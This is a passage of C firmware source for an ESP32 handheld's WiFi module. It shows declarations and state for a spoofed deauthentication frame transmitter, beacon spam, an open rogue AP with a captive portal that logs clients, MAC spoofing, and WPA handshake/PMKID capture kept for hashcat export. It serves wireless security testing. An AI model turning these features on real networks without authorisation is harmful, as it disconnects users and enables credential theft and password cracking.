/*
 * NocSif — WiFi (on-SoC 2.4 GHz, STA) worker (M5-P1). See wifi.h.
 *
 * Architecture (mirrors nfc.cpp / ducky.c):
 *   - A dedicated worker task owns every blocking radio action. The LVGL callbacks only
 *     post a command to the worker's queue (never touch the radio) so LVGL stays single-
 *     threaded and can't stall on association.
 *   - esp_wifi's own event callbacks (STA_START / DISCONNECTED / SCAN_DONE / GOT_IP) run on
 *     the system event task; they publish state and drive the small connection state machine
 *     (connect-on-start, bounded reconnect, fail-fast on an auth failure).
 *   - Bring-up (esp_netif + default event loop + esp_wifi_init/start) is LAZY on the first
 *     enable/scan request and gated on nocsif_reliability_safe_mode(), so boot stays fast and
 *     the coexistence risk (WiFi buffers vs the display-flush DMA path) is isolated to first use.
 *
 * Coexistence: WiFi/LWIP dynamic buffers are routed to PSRAM (CONFIG_SPIRAM_TRY_ALLOCATE_
 * WIFI_LWIP=y, sdkconfig.defaults) so the radio does not eat the internal DMA RAM the display
 * flush path needs (the documented DMA-hang class). The boot heartbeat logs int-dma free /
 * largest-block for the on-device headroom check.
 *
 * Credentials live in the NocSif NVS settings store (not esp_wifi's own NVS — WIFI_STORAGE_RAM),
 * so a working join is re-applied on the next enable and survives a reboot.
 */
#include "wifi.h"
#include "ble.h"            /* nocsif_ble_request_release — reclaim the radio from a persistent phone link */
#include "coex.h"           /* NOCSIF_DMA_CAPS + nocsif_int_dma_largest/_free — shared int-DMA gauge     */
#include <math.h>           /* cos/sqrt — the §4.6 P3 geo-stamp distance                                  */
#include "freertos/idf_additions.h" /* xTaskCreateWithCaps / vTaskDeleteWithCaps — PSRAM lazy-worker stacks (A3) */

#include <stdio.h>
#include <stdlib.h>   /* atoi (companion /api/brightness|/api/volume), malloc/free, qsort/strtol (P4 browser) */
#include <string.h>
#include <strings.h>  /* strcasecmp — §4.8a P4 file browser (sort + MIME by extension) */
#include <ctype.h>    /* isxdigit — §4.8a P4 query %XX decoding */

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"  /* §4.8a P3: mutex guarding the screen-mirror thumbnail buffer */
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "esp_mac.h"        /* esp_read_mac (factory STA MAC) */
#include "esp_random.h"     /* esp_fill_random (MAC spoof)    */
#include "esp_timer.h"      /* periodic channel hop + rate sampler (monitor mode) */
#include "esp_http_server.h"/* M5-P5·4 captive-portal HTTP server                 */
#include "lwip/sockets.h"   /* M5-P5·4 UDP:53 DNS redirector                      */
#include "mdns.h"           /* §4.8a Companion — nocsif.local responder           */
#include "cJSON.h"          /* §4.8a Companion P2 — parse POST command bodies      */

#include "settings.h"       /* nocsif_settings_* (NVS creds) */
#include "reliability.h"    /* nocsif_reliability_safe_mode */
#include "sdcard.h"         /* nocsif_sdcard_lock/unlock (PCAP -> /sd) */
#include "sdfs.h"           /* §4.8a P4 / §4.15: shared /sd jail + claim + listing rules */
#include "usb_gadget.h"     /* nocsif_usb_gadget_claim_sd (own /sd for PCAP) */
#include "power.h"          /* nocsif_power_batt_pct (§4.8a companion /api/ping) */

#include <sys/stat.h>       /* mkdir (PCAP output dir) */
#include <dirent.h>         /* opendir/readdir — §4.8a P4 companion /sd file browser */
#include <errno.h>

static const char *TAG = "wifi";

/* ---- tunables --------------------------------------------------------------------- */
#define WIFI_MAX_AP        20      /* AP rows we keep from a scan (sorted by RSSI)      */
#define WIFI_MAX_RETRY     5       /* reconnect attempts before giving up on a link     */
#define WIFI_CMD_QLEN      6       /* worker command queue depth                        */
#define WIFI_SSID_MAX      33      /* 32 + NUL                                          */
#define WIFI_PASS_MAX      64      /* WPA2 passphrase max                               */
#define WIFI_MAX_SAVED     8       /* remembered network profiles                       */

/* Passive parser (M5-P3): copy-out ring + nearby-AP table. The ring lives in PSRAM (the rx
 * hot path only memcpy's into it; the parser task drains + decodes). CAP_SNAP caps the bytes
 * kept per frame — enough for the mgmt header + the early IEs (SSID / DS / RSN) that identify
 * an AP; the rest is discarded. CAP_SLOTS is the burst depth (slots, power of two). */
#define CAP_SNAP          256      /* bytes copied per mgmt frame (headers + early IEs)  */
#define CAP_SNAP_DATA     48       /* bytes copied per data frame (MAC header only)      */
#define CAP_SLOTS         256      /* ring depth (power of two); ~70 KB PSRAM           */
#define MON_AP_MAX        32       /* nearby-AP table size (first-seen; stalest evicted) */
#define MON_STA_MAX       48       /* station table size (first-seen; stalest evicted)   */
#define MON_PROBE_MAX     48       /* probe-request table size (first-seen; stalest evicted) */
#define PCAP_SNAP         400      /* bytes captured per frame for PCAP (headers + payload) */
#define PCAP_SLOTS        128      /* PCAP ring depth (power of two); ~53 KB PSRAM        */
#define PCAP_RADIOTAP_LEN 13       /* our fixed radiotap header (channel + dBm signal)   */
#define MON_HS_MAX        32       /* key-exchange table size (BSSID-keyed; stalest evicted) */

/* NVS keys (<= 15 chars, NocSif "nocsif" namespace via the settings store). */
#define K_SSID      "wifi_ssid"    /* last-connected / auto-join primary (SSID)         */
#define K_PASS      "wifi_pass"    /* last-connected primary (passphrase)              */
#define K_AUTOJOIN  "wifi_autojoin"
#define K_SV_CNT    "wn_n"         /* saved-profile count; per-index keys "wn_s%d"/"wn_p%d" */
#define K_AP_SSID   "ap_ssid"      /* software-AP config (M5-P5·3): SSID / channel / hidden */
#define K_AP_CHAN   "ap_chan"
#define K_AP_HIDDEN "ap_hidden"
#define K_PT_PAGE   "pt_page"      /* captive-portal landing page filename ("" = built-in notice) */

/* ---- worker commands (UI/event task -> worker) ------------------------------------ */
typedef enum {
    CMD_ENABLE, CMD_DISABLE, CMD_SCAN, CMD_CONNECT,
    CMD_DISCONNECT, CMD_FORGET, CMD_SCAN_DONE,
    CMD_RECONNECT, CMD_RANDMAC, CMD_RESTMAC, CMD_APPLY_HOST,
    CMD_CONNECT_SAVED, CMD_FORGET_SSID, CMD_SETMAC,
    CMD_MONITOR_ON, CMD_MONITOR_OFF, CMD_MON_HOP, CMD_MON_CHAN,   /* M5-P2 monitor */
    CMD_PARSE_ON, CMD_PARSE_OFF,                                  /* M5-P3 parser  */
    CMD_PCAP_ON, CMD_PCAP_OFF,                                    /* M5-P3·3 PCAP  */
    CMD_PCAP_STREAM_ON, CMD_PCAP_STREAM_OFF,                      /* M5-P5+ live-PCAP over USB-CDC */
    CMD_HS_ON, CMD_HS_OFF,                                        /* M5-P4·1 EAPOL capture */
    CMD_MGMTTX_ON, CMD_MGMTTX_OFF, CMD_MGMTTX_TARGET,             /* M5-P5·1 management-frame TX */
    CMD_BEACON_ON, CMD_BEACON_OFF,                              /* M5-P5·2 beacon TX */
    CMD_EXPORT_HC,                                              /* M5 hc22000 export */
    CMD_AP_ON, CMD_AP_OFF,                                      /* M5-P5·3 software AP */
    CMD_PORTAL_ON, CMD_PORTAL_OFF, CMD_PORTAL_RELOAD,           /* M5-P5·4 captive portal */
    CMD_COMPANION_ON, CMD_COMPANION_OFF,                        /* §4.8a companion web remote (L4) */
    CMD_LEAN_ON, CMD_LEAN_OFF,                                  /* boot-time lean/full buffer profile (BLE coexist) */
    CMD_GEO_STAMP,                                              /* §4.6 P3: learn the connected network's location */
} wifi_cmd_type_t;

typedef struct {
    wifi_cmd_type_t type;
    char ssid[WIFI_SSID_MAX];
    char pass[WIFI_PASS_MAX];
    uint8_t mac[6];             /* CMD_SETMAC payload                         */
    int32_t arg;                /* CMD_MON_HOP (bool) / CMD_MON_CHAN (channel) / CMD_GEO_STAMP lat (µdeg) */
    int32_t arg2;               /* CMD_GEO_STAMP lon (µdeg)                     */
} wifi_cmd_t;

/* ---- published strings (lock-free double-buffer; writers publish, LVGL reads) ------ */
static char         s_status[2][24];
static char         s_detail[2][80];
static char         s_ip[2][16];
static char         s_netmask[2][16];
static char         s_gw[2][16];
static char         s_mac[2][18];              /* "aa:bb:cc:dd:ee:ff\0"                       */
static volatile int s_status_i, s_detail_i, s_ip_i, s_netmask_i, s_gw_i, s_mac_i;

static void publish_status(const char *s)  { int n = s_status_i ^ 1;  snprintf(s_status[n], sizeof s_status[n], "%s", s);   s_status_i = n; }
static void publish_detail(const char *s)  { int n = s_detail_i ^ 1;  snprintf(s_detail[n], sizeof s_detail[n], "%s", s);   s_detail_i = n; }
static void publish_ip(const char *s)      { int n = s_ip_i ^ 1;      snprintf(s_ip[n], sizeof s_ip[n], "%s", s);           s_ip_i = n; }
static void publish_netmask(const char *s) { int n = s_netmask_i ^ 1; snprintf(s_netmask[n], sizeof s_netmask[n], "%s", s); s_netmask_i = n; }
static void publish_gw(const char *s)      { int n = s_gw_i ^ 1;      snprintf(s_gw[n], sizeof s_gw[n], "%s", s);           s_gw_i = n; }
static void publish_mac_str(const char *s) { int n = s_mac_i ^ 1;     snprintf(s_mac[n], sizeof s_mac[n], "%s", s);         s_mac_i = n; }

static void clear_netinfo(void) { publish_ip(""); publish_netmask(""); publish_gw(""); }

/* ---- published scan snapshot (lock-free; a whole buffer is published atomically) --- */
static nocsif_wifi_ap_t  s_ap[2][WIFI_MAX_AP];
static int               s_ap_cnt[2];
static volatile int      s_ap_i;
static volatile uint32_t s_scan_gen;
static wifi_ap_record_t  s_recs[WIFI_MAX_AP];   /* worker scratch for record retrieval */

/* ---- module state ----------------------------------------------------------------- */
static TaskHandle_t   s_task;
static QueueHandle_t  s_q;
static esp_netif_t   *s_netif;
static esp_event_handler_instance_t s_h_wifi, s_h_ip;

static bool           s_driver_up;     /* esp_wifi_init done + handlers registered      */
static bool           s_sta_started;   /* between STA_START and STA_STOP                 */
static volatile bool  s_enabled;       /* user intent: radio powered on                 */
static bool           s_want_connect;  /* should hold a link (drives connect-on-start)  */
static bool           s_pending_scan;  /* a scan was asked before START completed        */
static volatile bool  s_connected;     /* has an IP                                      */
static volatile bool  s_scanning;      /* a scan is in flight                            */
static volatile bool  s_available;     /* mirror of s_driver_up for the C getter         */
static int            s_retry;         /* reconnect attempts this link                   */
static bool           s_auth_fail;     /* last drop looked like a bad passphrase          */
static volatile nocsif_wifi_join_state_t s_join_state;  /* drives the connecting screen   */

static char s_ssid[WIFI_SSID_MAX];     /* current target network (RAM cache)             */
static char s_pass[WIFI_PASS_MAX];

/* Remembered network profiles (SSID + passphrase), primed at init and upserted on each join. */
static char s_sv_ssid[WIFI_MAX_SAVED][WIFI_SSID_MAX];
static char s_sv_pass[WIFI_MAX_SAVED][WIFI_PASS_MAX];
static int  s_sv_cnt;
/* §4.6 Governor P3 geo-store — PLACES keyed by BSSID. One SSID can exist in many physical places
 * ("xfinitywifi", a phone hotspot), so a place is an ACCESS POINT (its BSSID) + the location it was last
 * connected from (micro-degrees) + the SSID it belongs to. Auto-learned by CMD_GEO_STAMP when a fresh GNSS
 * fix coincides with a link (the connected AP's BSSID from esp_wifi_sta_get_ap_info); the Governor draws a
 * fence (its radius setting) around each — "near a known AP -> wake WiFi". Persisted as `pl_n` +
 * `pl_b%d` (12 hex) / `pl_s%d` / `pl_la%d` / `pl_lo%d`; oldest evicted when full; forgetting an SSID drops
 * its places. */
#define WIFI_MAX_PLACES 8
typedef struct {
    uint8_t bssid[6];
    char    ssid[WIFI_SSID_MAX];
    int32_t lat_ud, lon_ud;
} wifi_place_t;
static wifi_place_t s_pl[WIFI_MAX_PLACES];
static int          s_pl_cnt;
#define GEO_RESTAMP_M   100.0f      /* re-learn a place only when the new fix is this far from the stored one */

/* Lean profile (BLE⇄WiFi coexistence): a BOOT-TIME input. When set, the (one and only) esp_wifi_init
 * uses the small buffer set (see bring_up). main.c arms it before WiFi comes up whenever Bluetooth is
 * on; it is never re-init at runtime (the driver's footprint is fixed at init and a runtime swap would
 * re-fragment the very pool it just freed — RAM-BUDGET.md remake #5/#9). */
static volatile bool s_lean;
static volatile bool s_autojoin = true;     /* auto-reconnect the saved net on enable      */
static uint8_t       s_mac_factory[6];       /* efuse STA MAC, for "restore default"        */
static bool          s_mac_factory_ok;       /* s_mac_factory populated                     */

/* ---- monitor / promiscuous capture state (M5-P2) ---------------------------------- *
 * A trivial O(1) rx callback tallies volatile counters (single writer, lock-free for the UI
 * readers); an esp_timer hops the channel and samples the 1 Hz frame rate off the LVGL task. */
static volatile bool      s_mon_active;               /* capture running                    */
static volatile bool      s_mon_hop = true;           /* hop 1..13 (true) vs lock (false)   */
static volatile int       s_mon_chan = 1;             /* current / locked channel (1..13)   */
static bool               s_pending_monitor;          /* asked before STA_START completed   */
static bool               s_mon_prev_connected;       /* had a live link before capture     */
static esp_timer_handle_t s_mon_timer;                /* periodic hop + rate sampler        */
static volatile uint32_t  s_mon_total;                /* all captured frames                */
static volatile uint32_t  s_mon_by_type[NOCSIF_WIFI_PKT_KINDS];
static volatile uint32_t  s_mon_ch[14];               /* per-channel tally (index 1..13)    */
static volatile uint32_t  s_mon_rate;                 /* frames/sec (~1 s window)           */
static volatile int8_t    s_mon_rssi_last;
static volatile int8_t    s_mon_rssi_peak;
static uint32_t           s_mon_rate_base;            /* s_mon_total at the window start    */
static int64_t            s_mon_rate_t0;              /* window start (esp_timer_get_time)  */
static volatile uint32_t  s_mon_deauth;               /* deauthentication frames (mgmt subtype 12) */
static volatile uint32_t  s_mon_disassoc;             /* disassociation frames (mgmt subtype 10)   */
static volatile uint32_t  s_mon_dd_rate;              /* deauth+disassoc per second (~1 s window)   */
static volatile uint32_t  s_mon_dd_peak;              /* peak deauth+disassoc per-second rate       */
static uint32_t           s_mon_dd_base;              /* (deauth+disassoc) at the window start      */

static void enter_promiscuous(void);   /* installs capture; called on worker or at STA_START */
static void monitor_teardown(void);    /* stops capture WITHOUT restoring the STA link       */
static void do_mgmt_tx_off(void);      /* M5-P5·1: stop management-frame TX (used by teardown) */
static void ap_teardown(void);         /* M5-P5·3: drop the AP to stopped-STA (used by STA entries) */

/* Management-frame TX state (M5-P5·1, active — authorized testing). A bounded-rate transmitter that
 * emits deauthentication / disassociation frames spoofing a chosen AP (source), to a client or the
 * broadcast address, on an esp_timer while monitor holds the target's channel. Neutral feature. */
static volatile bool      s_tx_active;
static uint8_t            s_tx_bssid[6];               /* target AP (spoofed source)         */
static uint8_t            s_tx_client[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }; /* dest; FF..=all */
static uint8_t            s_tx_channel = 1;            /* target home channel                */
static char               s_tx_ssid[WIFI_SSID_MAX];    /* target SSID (display only)         */
static bool               s_tx_have_target;
static volatile bool      s_tx_disassoc;               /* false=deauth(12), true=disassoc(10) */
static volatile uint32_t  s_tx_count;                  /* frames transmitted this session    */
static volatile uint32_t  s_tx_rate;                   /* frames/sec (~1 s window)           */
static uint32_t           s_tx_rate_base;
static int64_t            s_tx_rate_t0;
static esp_timer_handle_t s_tx_timer;
static bool               s_tx_logged;                 /* logged the first TX result this session */

/* Beacon TX state (M5-P5·2, active — authorized testing). Advertises a user-managed list of SSIDs
 * (add via keyboard, delete/rename/enable per entry; persisted to NVS) by transmitting beacon frames
 * on an esp_timer while the radio holds a channel. Reuses the P5·1 raw-TX override. The list is
 * written by the LVGL task and read by the esp_timer TX loop, so it is guarded by s_bcn_mux. */
#define BCN_MAX 32                                      /* max SSIDs in the beacon list       */
typedef struct { char ssid[WIFI_SSID_MAX]; bool en; } bcn_entry_t;
static void               do_beacon_off(void);          /* fwd (used by monitor_teardown)     */
static bcn_entry_t        s_bcn[BCN_MAX];
static int                s_bcn_cnt;
static volatile uint32_t  s_bcn_gen;                    /* bumps on any list change (UI rebuild) */
static bool               s_bcn_loaded;                 /* NVS list loaded once                */
static portMUX_TYPE       s_bcn_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool      s_bcn_active;
static volatile uint32_t  s_bcn_frames;                 /* beacon frames transmitted          */
static volatile uint32_t  s_bcn_rate;                   /* frames/sec (~1 s window)           */
static uint32_t           s_bcn_rate_base;
static int64_t            s_bcn_rate_t0;
static esp_timer_handle_t s_bcn_timer;

/* Software AP state (M5-P5·3, active — authorized testing). Brings the radio up as an OPEN access
 * point; a periodic esp_timer refreshes the associated-client list (driver association table + the
 * DHCP-server leases for IPs) and publishes it lock-free (double-buffered like the scan snapshot).
 * Config (SSID/channel/hidden) is cached + NVS-persisted, applied on Start. Single radio: AP is
 * exclusive with monitor/STA (do_ap_on suspends them; the STA entry points call do_ap_off). */
#define AP_CLI_MAX   10                                 /* client rows we track / publish     */
#define AP_SSID_DEF  "NocSif-AP"
typedef struct { uint8_t mac[6]; char ip[16]; int8_t rssi; } ap_cli_t;
static volatile bool      s_ap_active;
static char               s_ap_ssid[WIFI_SSID_MAX] = AP_SSID_DEF;
static volatile int       s_ap_channel = 1;
static volatile bool      s_ap_hidden;
static int                s_ap_maxconn = 4;             /* default association cap             */
static bool               s_ap_cfg_loaded;              /* NVS config primed once              */
static bool               s_ap_prev_connected;          /* had a live STA link before AP       */
static esp_netif_t       *s_ap_netif;                   /* default AP netif (DHCP server)      */
static esp_timer_handle_t s_ap_timer;                   /* periodic client-list refresh        */
static char               s_ap_ip[16];                  /* the AP's own IPv4 (gateway)         */
static portMUX_TYPE       s_sap_mux = portMUX_INITIALIZER_UNLOCKED;  /* guards s_ap_ssid        */
static ap_cli_t           s_ap_cli[2][AP_CLI_MAX];      /* published client snapshot (2-buffer)*/
static int                s_ap_cli_cnt[2];
static volatile int       s_ap_cli_i;
static volatile uint32_t  s_ap_cli_gen;                 /* bumps on a membership change         */

/* §4.8a Companion — SSID override consulted by apply_ap_config(). The companion AP is OPEN (operator
 * call: no join gate), like the software AP + captive portal, but broadcasts its own device-name SSID.
 * The companion path sets this before bringing the AP up and clears it on teardown; software-AP/portal
 * start clears it too. "" = use the configured s_ap_ssid. */
static char               s_ap_ssid_ov[WIFI_SSID_MAX];  /* "" = use s_ap_ssid; else this SSID   */
/* §4.8a companion — optional WPA2 password for the companion AP (operator can secure the link). Staged
 * from NVS ("comp_pw") in do_companion_on, consulted by apply_ap_config, cleared on teardown. "" (or
 * < 8 chars, WPA2's minimum) = OPEN AP, as before. Only the companion session ever sets this. */
#define K_COMP_PW           "comp_pw"
static char               s_ap_pass_ov[64];

/* Captive portal state (M5-P5·4, active — authorized testing). A UDP:53 DNS redirector (its own task)
 * + an esp_http_server that serves a landing page (from /sd, else a built-in notice) for every request
 * and records each client interaction to a RAM ring (for the UI) + /sd/nocsif/wifi/portal-NNN.log.
 * Layered on the open software AP; cannot outlive it (ap_teardown stops it). */
#define PORTAL_LOG_MAX   10                             /* recent interactions kept for the UI  */
#define PORTAL_LOG_LINE  80
#define PORTAL_PAGE_MAX  8192                           /* max landing-page bytes read from /sd */
#define PORTAL_DIR       "/sd/nocsif/wifi/portals"      /* landing-page library on the card     */
#define PT_SEL_MAX       64                             /* selected page filename buffer        */
static void               portal_stop(void);            /* fwd (used by ap_teardown)            */
static char               s_portal_page_sel[PT_SEL_MAX];/* chosen page filename ("" = built-in) */
static bool               s_portal_sel_loaded;          /* selection primed from NVS            */
static volatile bool      s_portal_active;
static httpd_handle_t     s_httpd;
static int                s_dns_sock = -1;
static volatile bool      s_dns_run;
static TaskHandle_t       s_dns_task;
static bool               s_portal_sd_ok;               /* SD claimed for this session          */
static volatile bool      s_portal_page_tried;          /* page load attempted (httpd task)     */
static char              *s_portal_page;                /* landing page (PSRAM); NULL = built-in */
static int                s_portal_page_len;
static char               s_portal_logpath[64];         /* resolved on the httpd task           */
static volatile uint32_t  s_portal_hits;
static volatile uint32_t  s_portal_gen;
static portMUX_TYPE       s_portal_mux = portMUX_INITIALIZER_UNLOCKED;
static char               s_portal_log[PORTAL_LOG_MAX][PORTAL_LOG_LINE];
static int                s_portal_log_head;            /* ring write index                     */
static int                s_portal_log_cnt;

/* §4.8a Companion control surface (L4) — P1 transport. An OPEN SoftAP (operator call: no join gate) +
 * mDNS `nocsif.local` + a routed esp_http_server (its OWN handle, distinct from the captive portal's
 * wildcard server, with which it is mutually exclusive). Anyone on the AP can control the watch — the
 * off-by-default toggle + the on-watch "linked" indicator are the guardrails. Written only by the
 * worker; read by the LVGL getters after `s_comp_active` is set (single writer + the active flag as a
 * barrier, mirroring the portal getters). */
#define COMP_HOST        "nocsif"                        /* -> nocsif.local                      */
static void               companion_stop(void);          /* fwd (used by ap_teardown)            */
static httpd_handle_t     s_comp_httpd;                  /* companion HTTP server (:80, routed)  */
static volatile bool      s_comp_active;                 /* surface is up                        */
static bool               s_comp_owns_ap;                /* companion brought the AP up (tear on off) */
static bool               s_mdns_up;                     /* mDNS responder running               */
static char               s_comp_ssid[WIFI_SSID_MAX];    /* open-AP SSID clients join (device name) */
static nocsif_companion_cmd_fn_t s_comp_cmd_fn;          /* P2: UI-registered command handler    */
static nocsif_companion_json_fn_t s_comp_menu_fn;        /* P2 redesign: /api/menu provider      */
static nocsif_companion_json_fn_t s_comp_state_fn;       /* P3: live-state provider (ping + /ws) */
static nocsif_companion_touch_fn_t s_comp_touch_fn;      /* interactive: WS uplink → remote pointer */

/* ---- §4.8a Companion — P3 live push (watch → phone over WebSocket) ---------------------------- *
 * The companion server keeps a small set of connected /ws client sockets; an esp_timer fires ~2×/s and
 * queues (httpd_queue_work) a state frame to each so the page can live-sync toggles/sliders and raise
 * the phone's native keyboard when a watch text field is focused. Sockets are added on the WS handshake
 * and pruned on any send error. All WS I/O happens on the httpd task (via httpd_queue_work). */
#define COMP_WS_MAX 4
static int                s_ws_fds[COMP_WS_MAX];         /* connected /ws client sockfds (0 = empty) */
static esp_timer_handle_t s_ws_timer;                    /* periodic state-push timer               */

/* P3 screen mirror: the UI publishes an RGB565 thumbnail here; the push loop sends it as a BINARY /ws
 * frame when it is new. One PSRAM buffer (header + payload) guarded by a mutex (UI task writes, httpd
 * task reads); a seq counter lets the loop skip resending an unchanged frame. */
#define COMP_THUMB_MAX  (220 * 270 * 2 + 8)              /* header(8) + max RGB565 payload (mirror 205x251 fits) */
static uint8_t           *s_thumb;                       /* PSRAM: 8-byte header + RGB565-LE payload */
static int                s_thumb_len;                   /* valid bytes in s_thumb (0 = none yet)   */
static uint32_t           s_thumb_seq;                   /* bumped on each publish                   */
static uint32_t           s_thumb_sent_seq;              /* last seq queued to clients              */
static SemaphoreHandle_t  s_thumb_mtx;

/* ---- passive parser state (M5-P3) ------------------------------------------------- *
 * The rx callback (WiFi task) is the single producer; a dedicated parser task is the single
 * consumer. An SPSC slot-ring (PSRAM) carries raw frame bytes across; the index handoff uses
 * release/acquire so a filled slot is visible before its publish. The nearby-AP table is
 * written by the parser and read by the LVGL task under a short spinlock. */
typedef struct {
    int64_t  ts_us;                 /* capture time (esp_timer_get_time)                 */
    int8_t   rssi;
    uint8_t  channel;               /* rx channel (1..13)                                */
    uint8_t  pkt_type;              /* wifi_promiscuous_pkt_type_t                       */
    uint16_t orig_len;              /* full frame length (incl. FCS)                     */
    uint16_t cap_len;              /* bytes actually copied (<= CAP_SNAP)                */
    uint8_t  data[CAP_SNAP];
} cap_slot_t;

static cap_slot_t       *s_ring;                 /* PSRAM, CAP_SLOTS entries (lazy)      */
static volatile uint32_t s_ring_head;            /* consumer index (parser)              */
static volatile uint32_t s_ring_tail;            /* producer index (rx cb)               */
static volatile uint32_t s_ring_drop;            /* frames dropped (ring full)           */
static volatile bool     s_parse_active;         /* rx cb copies + parser decodes        */
static TaskHandle_t      s_parse_task;

/* Nearby-AP table (parser writes, LVGL reads; guarded by s_ap_mux). */
typedef struct {
    bool     used;
    uint8_t  bssid[6];
    char     ssid[WIFI_SSID_MAX];   /* "" = hidden                                       */
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  sec;                   /* nocsif_wifi_sec_t                                 */
    uint16_t frames;
    int64_t  last_us;
    char     vendor[12];
} mon_ap_t;

static mon_ap_t          s_mon_ap[MON_AP_MAX];
static int               s_mon_ap_cnt;
static volatile uint32_t s_mon_ap_gen;           /* bumps on insert / evict (structural) */
static portMUX_TYPE      s_ap_mux = portMUX_INITIALIZER_UNLOCKED;

/* Station table (M5-P3·2): a client device seen in a data frame, mapped to its AP. Parser
 * writes, LVGL reads; shares s_ap_mux (short critical sections, low contention). */
typedef struct {
    bool     used;
    uint8_t  mac[6];
    uint8_t  bssid[6];              /* the AP this station is talking to (all-zero if none) */
    uint8_t  channel;
    int8_t   rssi;
    uint16_t frames;
    int64_t  last_us;
    char     vendor[12];
} mon_sta_t;
static mon_sta_t         s_mon_sta[MON_STA_MAX];
static int               s_mon_sta_cnt;
static volatile uint32_t s_mon_sta_gen;

/* Probe-request table (M5-P3·2): a (device, requested-SSID) pair. */
typedef struct {
    bool     used;
    uint8_t  mac[6];
    char     ssid[WIFI_SSID_MAX];   /* "" = a broadcast / wildcard probe                 */
    int8_t   rssi;
    uint16_t count;
    int64_t  last_us;
    char     vendor[12];
} mon_probe_t;
static mon_probe_t       s_mon_probe[MON_PROBE_MAX];
static int               s_mon_probe_cnt;
static volatile uint32_t s_mon_probe_gen;

/* Key-exchange table (M5-P4·1): one BSSID's observed EAPOL 4-way progress + any advertised PMKID.
 * Parser writes, LVGL reads; shares s_ap_mux. The M5 "hc22000 export" (passive polish) also retains
 * the client MAC + the fields a hashcat-22000 line needs: the ANonce from message 1, and the MIC +
 * the raw EAPOL bytes from message 2. */
#define HS_EAPOL_MAX 160               /* captured M2 EAPOL frame bytes (header + key frame)  */
typedef struct {
    bool     used;
    uint8_t  bssid[6];
    uint8_t  sta[6];                /* the client in the exchange                        */
    bool     have_sta;
    uint8_t  msg_mask;              /* bit0=msg1 … bit3=msg4 of the 4-way exchange seen   */
    bool     has_pmkid;
    uint8_t  pmkid[16];
    bool     have_anonce;
    uint8_t  anonce[32];           /* from message 1 (AP nonce)                          */
    bool     have_mic;
    uint8_t  mic[16];              /* from message 2                                     */
    uint8_t  eapol[HS_EAPOL_MAX];  /* the message-2 EAPOL frame, MIC field zeroed        */
    uint8_t  eapol_len;
    int8_t   rssi;
    uint16_t frames;                /* EAPOL frames seen for this BSSID                   */
    int64_t  last_us;
    char     vendor[12];
} mon_hs_t;
static mon_hs_t          s_mon_hs[MON_HS_MAX];
static int               s_mon_hs_cnt;
static volatile uint32_t s_mon_hs_gen;

/* PCAP capture (M5-P3·3): a SEPARATE all-frames SPSC ring (rx cb = producer) drained by a
 * dedicated big-stack writer task that owns the FILE*. Kept independent of the parser ring so
 * PCAP snaplen/rate never perturbs the identity tables. */
typedef struct {
    int64_t  ts_us;
    int8_t   rssi;
    uint8_t  channel;
    uint16_t orig_len;              /* full on-air frame length (before snaplen truncation) */
    uint16_t cap_len;              /* bytes actually copied (<= PCAP_SNAP)                  */
    uint8_t  data[PCAP_SNAP];
} pcap_slot_t;

static pcap_slot_t      *s_pcap_ring;             /* PSRAM, PCAP_SLOTS entries (lazy)     */
static volatile uint32_t s_pcap_head;             /* consumer index (writer task)         */
static volatile uint32_t s_pcap_tail;             /* producer index (rx cb)               */
static volatile uint32_t s_pcap_drop;             /* frames dropped (ring full)           */
static volatile bool     s_pcap_active;           /* rx cb copies + writer drains         */
static volatile bool     s_pcap_want;             /* requested on/off (writer owns close) */
static volatile bool     s_pcap_idle = true;      /* writer parked (no open file) -> safe to delete */
static TaskHandle_t      s_pcap_task;
static volatile uint32_t s_pcap_frames;           /* frames written this session          */
static volatile uint32_t s_pcap_bytes;            /* bytes written (incl. headers)        */
static char              s_pcap_path[64];         /* current/last file (writer + LVGL read)*/
typedef enum { PCAP_OFF = 0, PCAP_REC, PCAP_NOSD, PCAP_FILESHARE, PCAP_ERR,
               PCAP_STREAM,                       /* M5-P5+ live-streaming to USB-CDC          */
               PCAP_NOHOST } pcap_state_t;         /* M5-P5+ armed for CDC, waiting for a host  */
static volatile int      s_pcap_state = PCAP_OFF;

/* Live-PCAP sink (M5-P5+): the shared writer drains either to an SD file (SD, the P3·3 recorder) or
 * to the USB CDC serial port as a live stream (CDC) that a host reads in real time (Wireshark via
 * the bundled extcap). One sink at a time — both share the single ring + writer task. */
typedef enum { PCAP_SINK_SD = 0, PCAP_SINK_CDC } pcap_sink_t;
static volatile int      s_pcap_sink = PCAP_SINK_SD;

/* PCAP capture filter (M5-P4·1): FULL writes every captured frame (P3·3 behaviour); EAPOL writes
 * only EAPOL data frames + the beacon/probe-response that names a network, to hs-NNN.pcap. Set
 * before arming the shared writer; the rx copy-out and the file-name prefix read it. */
typedef enum { PCAP_FILTER_FULL = 0, PCAP_FILTER_EAPOL } pcap_filter_t;
static volatile int      s_pcap_filter = PCAP_FILTER_FULL;

static void parse_frame(const cap_slot_t *s);  /* decode one captured frame -> AP/sta/probe */
static void pcap_stop_and_free(void);          /* stop PCAP + reclaim the writer task stack   */

/* ---- getters ---------------------------------------------------------------------- */
bool        nocsif_wifi_available(void)   { return s_available; }
bool        nocsif_wifi_enabled(void)     { return s_enabled; }
bool        nocsif_wifi_connected(void)   { return s_connected; }
bool        nocsif_wifi_scanning(void)    { return s_scanning; }
nocsif_wifi_join_state_t nocsif_wifi_join_state(void) { return s_join_state; }
const char *nocsif_wifi_status_str(void)  { return s_status[s_status_i]; }
const char *nocsif_wifi_detail_str(void)  { return s_detail[s_detail_i]; }
const char *nocsif_wifi_ip_str(void)      { return s_ip[s_ip_i]; }
const char *nocsif_wifi_netmask_str(void) { return s_netmask[s_netmask_i]; }
const char *nocsif_wifi_gateway_str(void) { return s_gw[s_gw_i]; }
const char *nocsif_wifi_mac_str(void)     { return s_mac[s_mac_i]; }
const char *nocsif_wifi_saved_ssid(void)  { return s_ssid; }
bool        nocsif_wifi_autojoin(void)    { return s_autojoin; }
uint32_t    nocsif_wifi_scan_gen(void)    { return s_scan_gen; }
int         nocsif_wifi_ap_count(void)    { return s_ap_cnt[s_ap_i]; }

bool nocsif_wifi_ap_get(int idx, nocsif_wifi_ap_t *out)
{
